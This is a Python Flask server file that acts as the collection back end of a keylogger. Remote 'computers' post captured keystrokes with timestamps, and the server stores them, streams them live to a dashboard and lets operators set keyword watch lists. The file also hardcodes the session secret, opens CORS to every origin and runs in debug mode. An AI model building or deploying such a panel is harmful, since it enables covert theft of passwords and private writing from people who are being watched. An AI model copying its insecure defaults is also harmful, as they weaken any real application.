import os
from flask import Flask, render_template, request, jsonify, session
from keylogger.keylogger_service import KeyLoggerService
from flask_services import user_service, computers_service, keywords_service
from flask_cors import CORS
import uuid
from flask_socketio import SocketIO, emit
import time

# Get the project's root directory
root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

app = Flask(
    __name__, 
    template_folder=os.path.join(root_dir, 'templates'), 
    static_folder=os.path.join(root_dir, 'static')
)

CORS(app)
app.secret_key = "supersecretkey"
socketio = SocketIO(app, cors_allowed_origins="*")

keylogger = KeyLoggerService()

# --- Frontend ---
@app.route("/")
def index():
    return render_template("index.html")

# --- Users ---
@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if user_service.validate_user(username, password):
        session["username"] = username
        return jsonify({"success": True, "message": "Login successful!"})
    return jsonify({"success": False, "message": "Invalid credentials."})

@app.route("/api/signup", methods=["POST"])
def signup():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if not user_service.create_user(username, password):
        return jsonify({"success": False, "message": "User ID already exists."})
    return jsonify({"success": True, "message": "User created successfully!"})

# --- Computers ---
@app.route("/api/computers", methods=["GET"])
def get_computers():
    computers = computers_service.load_computers()
    for comp_id, comp in computers.items():
        comp["keystrokes"] = keylogger.get_keys(comp_id)
    return jsonify(computers)

@app.route("/api/computers", methods=["POST"])
def add_computer():
    data = request.json
    name = data.get("name")
    comp_id = computers_service.add_computer(name)
    return jsonify({"success": True, "id": comp_id})

@app.route("/api/computers/<comp_id>", methods=["DELETE"])
def delete_computer(comp_id):
    computers_service.delete_computer(comp_id)
    keylogger.delete_keys(comp_id)
    return jsonify({"success": True})

@app.route("/api/computers/rename/<comp_id>", methods=["PUT"])
def rename_computer(comp_id):
    data = request.json
    new_name = data.get("new_name")
    if computers_service.rename_computer(comp_id, new_name):
        return jsonify({"success": True, "message": "Computer renamed successfully."})
    return jsonify({"success": False, "message": "Computer not found."})

# --- Keystrokes ---
@app.route("/api/keystrokes", methods=["POST"])
def log_keystroke():
    data = request.json
    comp_id = data.get("comp_id")
    words = data.get("words")
    
    if not comp_id or not words:
        return jsonify({"success": False, "message": "Missing required data"}), 400
    
    for word_entry in words:
        key = word_entry.get("key")
        timestamp = word_entry.get("timestamp")
        keylogger.log_key(comp_id, key, timestamp)

    # Emit the new words to the frontend
    socketio.emit('new_keystrokes', {'comp_id': comp_id, 'words': words})

    return jsonify({"success": True}), 200

@app.route("/api/keystrokes/<comp_id>", methods=["GET"])
def get_keystrokes(comp_id):
    keystrokes = keylogger.get_keys(comp_id)
    return jsonify(keystrokes)

# --- Keywords ---
@app.route("/api/keywords", methods=["GET"])
def get_keywords():
    keywords = keywords_service.load_keywords()
    return jsonify(keywords)

@app.route("/api/keywords", methods=["POST"])
def add_keyword():
    data = request.json
    kw = data.get("keyword")
    keywords_service.add_keyword(kw)
    return jsonify({"success": True})

@app.route("/api/keywords/<kw>", methods=["DELETE"])
def delete_keyword(kw):
    keywords_service.delete_keyword(kw)
    return jsonify({"success": True})

if __name__ == "__main__":
    socketio.run(app, host="127.0.0.1", port=8000, debug=True)
